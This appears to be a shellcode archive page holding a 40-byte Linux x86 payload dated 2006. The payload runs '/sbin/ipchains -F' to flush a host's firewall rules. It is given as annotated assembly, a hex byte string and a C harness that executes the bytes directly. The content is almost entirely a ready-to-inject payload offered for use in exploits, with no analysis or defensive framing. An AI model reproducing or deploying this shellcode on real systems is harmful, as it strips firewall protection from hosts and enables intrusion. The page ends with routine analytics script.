<html><head><title>Linux/x86 - ipchains -F - 40 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/* By Kris Katterjohn 11/18/2006
 *
 * 40 byte shellcode to flush ipchains for Linux x86
 *
 *
 *
 * section .text
 *
 *      global _start
 *
 * _start:
 *
 * ; execve(&quot;/sbin/ipchains&quot;, { &quot;/sbin/ipchains&quot;, &quot;-F&quot;, NULL }, NULL)
 *
 *      push byte 11
 *      pop eax
 *      cdq
 *      push edx
 *      push word 0x462d
 *      mov ecx, esp
 *      push edx
 *      push word 0x736e
 *      push 0x69616863
 *      push 0x70692f6e
 *      push 0x6962732f
 *      mov ebx, esp
 *      push edx
 *      push ecx
 *      push ebx
 *      mov ecx, esp
 *      int 0x80
 */

main()
{
       char shellcode[] =
               &quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x46\x89&quot;
               &quot;\xe1\x52\x66\x68\x6e\x73\x68\x63\x68\x61&quot;
               &quot;\x69\x68\x6e\x2f\x69\x70\x68\x2f\x73\x62&quot;
               &quot;\x69\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80&quot;;

       (*(void (*)()) shellcode)();
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
